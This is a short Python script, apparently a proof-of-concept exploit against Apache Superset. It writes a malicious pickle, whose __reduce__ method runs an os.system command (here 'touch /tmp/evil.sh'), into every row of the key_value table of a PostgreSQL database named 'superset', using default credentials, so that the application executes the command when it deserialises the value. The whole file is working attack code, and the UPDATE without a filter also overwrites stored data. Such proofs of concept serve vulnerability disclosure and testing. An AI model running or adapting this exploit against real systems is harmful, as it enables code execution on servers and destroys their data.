import os
import psycopg2
import pickle5 as pickle

class RCE:
    def __reduce__(self):
        cmd = ('touch /tmp/evil.sh')
        return os.system, (cmd,)

def exploit():
    pickled = pickle.dumps(RCE())

    con = psycopg2.connect(
        database="superset",
        user="superset",
        password="superset",
        host="localhost",
        port= '5432'
    )

    cursor = con.cursor()

    cursor.execute('''UPDATE key_value SET value = %s''', (psycopg2.Binary(pickled),))
    con.commit()

if __name__ == '__main__':
    exploit()